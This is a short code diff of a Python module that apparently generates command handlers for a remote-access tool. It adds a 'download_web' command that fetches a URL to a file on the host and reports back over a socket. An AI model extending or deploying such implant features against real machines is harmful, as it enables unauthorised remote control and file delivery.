@@ -1,10 +1,9 @@
-# WEB + COM
+# GUI + CUI
 # done
 import library.modules.config as config
+
 config.main()
 interface = config.interface
-if interface == "GUI":
-    from flask import jsonify
 
 
 def main(option):
@@ -19,7 +18,7 @@ def download_web(command):
     f = open(file_name, 'wb')
     f.write(url_data)
     f.close()
-    main_send('[+]Downloaded : ' + url + ' -> ' + file_name, s)''')
+    send_all(s,'[+]Downloaded : ' + url + ' -> ' + file_name)''')
         config.logics.append('''
             elif command == "download_web":
                 download_web(data)''')
